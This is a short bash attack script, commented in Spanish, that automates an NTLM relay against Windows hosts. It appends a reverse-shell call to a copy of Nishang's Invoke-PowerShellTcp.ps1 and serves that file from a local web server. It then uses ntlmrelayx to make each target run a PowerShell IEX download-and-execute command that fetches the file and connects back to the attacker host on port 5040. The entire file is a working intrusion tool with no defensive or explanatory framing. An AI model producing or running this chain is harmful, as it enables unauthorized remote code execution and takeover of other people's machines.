#!/usr/bin/env bash

LBlue='\033[0;94m'      # Ligth Blue
BBlue='\033[1;34m'      # Bold Blue
BWhite='\033[1;37m'     # Bold White
Color_Off='\033[0m'     # Text Reset

tput civis

while [ ! -f .attack ];do
    clear
    echo -e "${LBlue}[${BBlue}+${LBlue}] ${BWhite}Setting up Web Server...${Color_Off}\n"
    sleep 5
done

HOST=$(cat host.txt)

# Copiar Script de Nishan en PowerShell
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 PS.ps1

# Agregando parametros al script de Nishang
echo "" >> PS.ps1
echo "Invoke-PowerShellTcp -Reverse -IPAddress $HOST -Port 5040" >> PS.ps1

# Levantando servidor web local
python3 -m http.server &>/dev/null &

# Enviando peticion para descarga del script
ntlmrelayx.py -tf target.txt -c "powershell IEX(New-Object Net.WebClient).downloadString('http://$HOST:8000/PS.ps1')" -smb2support